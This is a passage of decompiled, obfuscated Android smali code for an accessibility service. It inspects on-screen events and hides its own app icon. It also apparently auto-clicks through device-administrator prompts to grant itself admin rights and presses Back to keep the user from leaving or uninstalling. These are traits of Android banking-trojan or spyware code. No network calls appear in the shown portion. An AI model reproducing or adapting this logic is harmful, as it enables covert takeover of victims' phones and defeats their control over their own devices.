    invoke-static {v1, v3}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    sget-object v3, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v4, 0x10

    aget-object v3, v3, v4

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    const/4 v5, 0x0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v7

    aput-object v7, v4, v5

    invoke-static {v3, v4}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    sget-object v4, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v5, 0xd

    aget-object v4, v4, v5

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/Object;

    const/4 v7, 0x0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v8

    aput-object v8, v5, v7

    invoke-static {v4, v5}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v4

    :try_start_2
    sget-boolean v5, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a:Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    if-eqz v5, :cond_3

    :try_start_3
    sget-object v5, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v7, 0x18

    aget-object v5, v5, v7

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_3

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    const/4 v5, 0x0

    const/4 v7, 0x1

    new-array v7, v7, [Ljava/lang/String;

    const/4 v8, 0x0

    sget-object v9, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v10, 0x12

    aget-object v9, v9, v10

    aput-object v9, v7, v8

    invoke-static {v4, v5, v7}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a(Landroid/view/accessibility/AccessibilityNodeInfo;I[Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    :cond_3
    :try_start_4
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v4

    packed-switch v4, :pswitch_data_0

    :cond_4
    const/4 v1, -0x1

    :cond_5
    packed-switch v1, :pswitch_data_1

    :cond_6
    :goto_1
    :pswitch_0
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_0

    :catch_2
    move-exception v0

    :try_start_5
    throw v0
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    :catch_3
    move-exception v0

    :try_start_6
    throw v0

    :pswitch_1
    sget-object v4, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v5, 0xe

    aget-object v4, v4, v5

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const/4 v1, 0x0

    if-eqz v2, :cond_5

    :pswitch_2
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v1

    sparse-switch v1, :sswitch_data_0

    :cond_7
    const/4 v0, -0x1

    :cond_8
    packed-switch v0, :pswitch_data_2

    goto :goto_1

    :pswitch_3
    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    new-instance v1, Landroid/content/ComponentName;

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v2, 0x0

    const/4 v3, 0x1

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    :try_start_7
    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a(Landroid/view/accessibility/AccessibilityNodeInfo;ILandroid/content/Context;)V

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x12

    if-lt v0, v1, :cond_6

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    sget-object v4, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v5, 0x16

    aget-object v4, v4, v5

    aput-object v4, v2, v3

    invoke-static {v0, v1, v2}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a(Landroid/view/accessibility/AccessibilityNodeInfo;I[Ljava/lang/String;)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_4

    goto :goto_1

    :catch_4
    move-exception v0

    :try_start_8
    new-instance v0, Lzvy/zpfypq/bbuhtkwvaf/g;

    const-wide/16 v2, 0x3e8

    const-wide/16 v4, 0x3e8

    move-object v1, p0

    invoke-direct/range {v0 .. v5}, Lzvy/zpfypq/bbuhtkwvaf/g;-><init>(Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;JJ)V

    invoke-virtual {v0}, Lzvy/zpfypq/bbuhtkwvaf/g;->start()Landroid/os/CountDownTimer;

    goto :goto_1

    :sswitch_0
    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v4, 0xb

    aget-object v1, v1, v4

    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_7

    if-eqz v2, :cond_8

    :sswitch_1
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v1, 0x15

    aget-object v0, v0, v1

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    const/4 v0, 0x1

    if-eqz v2, :cond_8

    :sswitch_2
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v1, 0x1c

    aget-object v0, v0, v1

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    const/4 v0, 0x2

    if-eqz v2, :cond_8

    :sswitch_3
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v1, 0xa

    aget-object v0, v0, v1

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    const/4 v0, 0x3

    if-eqz v2, :cond_8

    :sswitch_4
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v1, 0x9

    aget-object v0, v0, v1

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    const/4 v0, 0x4

    if-eqz v2, :cond_8

    :sswitch_5
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v1, 0x17

    aget-object v0, v0, v1

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    const/4 v0, 0x5

    if-eqz v2, :cond_8

    :pswitch_4
    sget-boolean v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a:Z

    if-eqz v0, :cond_6

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/String;

    const/4 v4, 0x0

    sget-object v5, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v7, 0x1b

    aget-object v5, v5, v7

    aput-object v5, v3, v4

    invoke-static {v0, v1, v3}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a(Landroid/view/accessibility/AccessibilityNodeInfo;I[Ljava/lang/String;)V

    if-eqz v2, :cond_6

    :pswitch_5
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v1, 0x1a

    aget-object v0, v0, v1

    invoke-virtual {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    new-instance v1, Landroid/content/ComponentName;

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-class v4, Lzvy/zpfypq/bbuhtkwvaf/IlIlILlIILIllIllllIllllIlllIlllllIIlIIlIlllILlIllIIIllLl;

    invoke-direct {v1, v3, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_1

    :try_start_9
    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x13

    if-lt v3, v4, :cond_a

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_5

    move-result v3

    if-nez v3, :cond_9

    :try_start_a
    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    const/4 v4, 0x0

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/String;

    const/4 v7, 0x0

    sget-object v8, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v9, 0x19

    aget-object v8, v8, v9

    aput-object v8, v5, v7

    invoke-static {v3, v4, v5}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a(Landroid/view/accessibility/AccessibilityNodeInfo;I[Ljava/lang/String;)V

    if-eqz v2, :cond_6

    :cond_9
    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    const/4 v4, 0x0

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/String;

    const/4 v7, 0x0

    sget-object v8, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v9, 0xf

    aget-object v8, v8, v9

    aput-object v8, v5, v7

    invoke-static {v3, v4, v5}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a(Landroid/view/accessibility/AccessibilityNodeInfo;I[Ljava/lang/String;)V

    const/4 v3, 0x1

    invoke-virtual {p0, v3}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->performGlobalAction(I)Z

    if-eqz v2, :cond_6

    :cond_a
    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    if-nez v0, :cond_b

    const/4 v0, 0x0

    sput v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->g:I

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v3, 0x1

    invoke-static {v0, v1, v3}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a(Landroid/view/accessibility/AccessibilityNodeInfo;II)V

    if-eqz v2, :cond_6

    :cond_b
    const/4 v0, 0x0

    sput v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->g:I

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v2, 0x0

    invoke-static {v0, v1, v2}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a(Landroid/view/accessibility/AccessibilityNodeInfo;II)V

    goto/16 :goto_1

    :catch_5
    move-exception v0

    throw v0
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_1

    :pswitch_data_0
    .packed-switch 0x6b849a9c
        :pswitch_1
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x0
        :pswitch_2
    .end packed-switch

    :sswitch_data_0
    .sparse-switch
        -0x7cfbf3f4 -> :sswitch_0
        -0x446e3259 -> :sswitch_5
        -0x232181d9 -> :sswitch_1
        -0x5911562 -> :sswitch_4
        0x419e7de3 -> :sswitch_3
        0x4ddb1a87 -> :sswitch_2
    .end sparse-switch

    :pswitch_data_2
    .packed-switch 0x0
        :pswitch_3
        :pswitch_3
        :pswitch_3
        :pswitch_0
        :pswitch_4
        :pswitch_5
    .end packed-switch
.end method

.method public onInterrupt()V
    .locals 0

    return-void
.end method

.method protected onServiceConnected()V
    .locals 3

    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onServiceConnected()V

    new-instance v0, Landroid/accessibilityservice/AccessibilityServiceInfo;

    invoke-direct {v0}, Landroid/accessibilityservice/AccessibilityServiceInfo;-><init>()V

    const/16 v1, 0x5b

    :try_start_0
    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    const-wide/16 v1, 0x0

    iput-wide v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->notificationTimeout:J

    const/4 v1, -0x1

    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->eventTypes:I

    const/4 v1, -0x1

    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->feedbackType:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    invoke-virtual {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->setServiceInfo(Landroid/accessibilityservice/AccessibilityServiceInfo;)V

    return-void

    :catch_0
    move-exception v1

    goto :goto_0
.end method
